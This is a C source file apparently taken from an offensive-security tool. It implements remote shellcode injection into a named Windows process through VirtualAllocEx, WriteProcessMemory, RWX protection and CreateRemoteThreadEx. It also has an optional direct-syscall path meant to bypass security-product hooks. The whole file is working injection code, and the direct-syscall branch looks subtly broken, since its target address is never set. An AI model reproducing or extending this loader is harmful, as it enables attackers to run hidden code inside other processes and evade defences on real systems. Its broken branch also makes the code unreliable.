#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>

#include "error.h"
#include "direct_syscall.h"

BOOL findTargetProcessRemoteShellCode(IN char* szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {

    PROCESSENTRY32 pe32;
    HANDLE hProcessSnap;
    BOOL bState = TRUE;

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        handleError(ERROR_INVALID_PROCESS, "Failed to create process snapshot");
        bState = FALSE; goto Cleanup;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        handleError(ERROR_INVALID_PROCESS, "Failed to get first process");
        CloseHandle(hProcessSnap);
        bState = FALSE; goto Cleanup;
    }

    do {
        if (strcmp(pe32.szExeFile, szProcessName) == 0) {
            *dwProcessId = pe32.th32ProcessID;
            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *dwProcessId);
            if (*hProcess == NULL) {
                handleError(ERROR_FAILED_TO_OPEN_PROCESS, "Failed to open process");
                CloseHandle(hProcessSnap);
                bState = FALSE; goto Cleanup;
            }

            printf("Found target process: %s (PID: %lu)\n", szProcessName, *dwProcessId);
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    
    Cleanup:
        if (hProcessSnap != INVALID_HANDLE_VALUE) {
            CloseHandle(hProcessSnap);
        }
        if (!*dwProcessId || !*hProcess) {
            return bState;
        }

        return bState;
}

BOOL runShellcodeInjection(IN char* TARGET_PROCESS, IN  PBYTE pShellcodeBuffer, IN DWORD dwShellcodeBufferSize, IN enum DirectSyscallSwitch DirectSyscallSwitch, IN pNtTable pNtTable) {


    HANDLE hProcess = NULL;
    DWORD dwProcessId = 0;

    LPVOID pShellcodeBaseAddress = NULL;
    SIZE_T sNumberOfBytesWritten = 0;
    DWORD dwOldProtection = 0;
 

    switch (DirectSyscallSwitch)
    {
    case On:
        // Not yet DS friendly.
        if (!findTargetProcessRemoteShellCode(TARGET_PROCESS, &dwProcessId, &hProcess)) {
            handleError(ERROR_INVALID_PROCESS, "Failed to find target process");
            return FALSE;
        }

        if (!runDirectSyscall(&pNtTable, SysNtAllocateVirtualMemory, hProcess, dwShellcodeBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
            handleError(ERROR_INVALID_SYSCALL, "Failed to call NtAllocateVirtualMemory");
            return FALSE;
        }

        printf("Allocated memory in the remote process\n");

        if (!runDirectSyscall(&pNtTable, SysNtWriteVirtualMemory, hProcess, pShellcodeBaseAddress, pShellcodeBuffer, dwShellcodeBufferSize, &sNumberOfBytesWritten) || dwShellcodeBufferSize != sNumberOfBytesWritten) {
            handleError(ERROR_INVALID_SYSCALL, "Failed to call NtWriteVirtualMemory");
            return FALSE;
        }

        printf("Wrote memory in the remote process\n");

        if (!runDirectSyscall(&pNtTable, SysNtProtectVirtualMemory, hProcess, pShellcodeBaseAddress, dwShellcodeBufferSize, 0x40, &dwOldProtection)) {
            handleError(ERROR_INVALID_SYSCALL, "Failed to call NtProtectVirtualMemory");
            return FALSE;
        }

        printf("[#] Press any key to execute the shellcode\n");
        getchar();

        if (!runDirectSyscall(&pNtTable, SysNtCreateThreadEx, hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeBaseAddress, NULL, 0, NULL, NULL)) {
            handleError(ERROR_INVALID_SYSCALL, "Failed to call NtCreateThreadEx");
            return FALSE;
        }

        printf("[+] Shellcode executed successfully\n");
        break;
    // Default is off, for now.
    default:
        if (!findTargetProcessRemoteShellCode(TARGET_PROCESS, &dwProcessId, &hProcess)) {
            handleError(ERROR_INVALID_PROCESS, "Failed to find target process");
            return FALSE;
        }
        getchar();
        if (!(pShellcodeBaseAddress = VirtualAllocEx(hProcess, NULL, dwShellcodeBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
            handleError(ERROR_FAILED_TO_ALLOCATE_MEMORY, "Failed to allocate memory in the remote process");
            return FALSE;
        } 

        if (!WriteProcessMemory(hProcess, pShellcodeBaseAddress, pShellcodeBuffer, dwShellcodeBufferSize, &sNumberOfBytesWritten) || dwShellcodeBufferSize != sNumberOfBytesWritten) {
            handleError(ERROR_FAILED_TO_WRITE_MEMORY, "Failed to write memory in the remote process");
            return FALSE;
        }

        // Debugging purposes
        // printf("[i] Wrote Shellcode to address 0x%p \n", pShellcodeBaseAddress);

        if (!VirtualProtectEx(hProcess, pShellcodeBaseAddress, dwShellcodeBufferSize, 0x40, &dwOldProtection)) {
            handleError(ERROR_FAILED_TO_OPEN_PROCESS, "Failed to change memory protection in the remote process");
            return FALSE;
        }

        printf("[#] Press any key to execute the shellcode\n");
        getchar();

        if(!CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeBaseAddress, NULL, 0, NULL, NULL)) {
            handleError(ERROR_FAILED_TO_OPEN_THREAD, "Failed to create remote thread in the remote process");
            return FALSE;
        }

        printf("[+] Shellcode executed successfully\n");
        break;
    }

    return TRUE;
}
